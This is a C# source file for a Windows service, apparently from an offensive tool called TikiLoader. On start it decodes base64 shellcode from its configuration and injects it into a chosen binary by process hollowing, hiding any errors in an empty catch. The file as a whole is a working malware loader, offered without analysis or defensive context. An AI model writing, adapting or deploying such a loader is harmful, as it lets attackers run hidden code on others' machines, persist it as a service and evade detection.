using System;
using System.Configuration;
using System.ServiceProcess;

using TikiLoader;

namespace TikiService
{
    public partial class TikiService : ServiceBase
    {
        public TikiService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                var settings = ConfigurationManager.AppSettings;
                string binary = settings["Binary"];
                byte[] shellcode = Convert.FromBase64String(settings["Shellcode"]);

                var hollower = new Hollower();
                hollower.HollowWithoutPid(binary, shellcode);
            }
            catch
            {
                //pokemon
            }
        }

        protected override void OnStop()
        {
        }
    }
}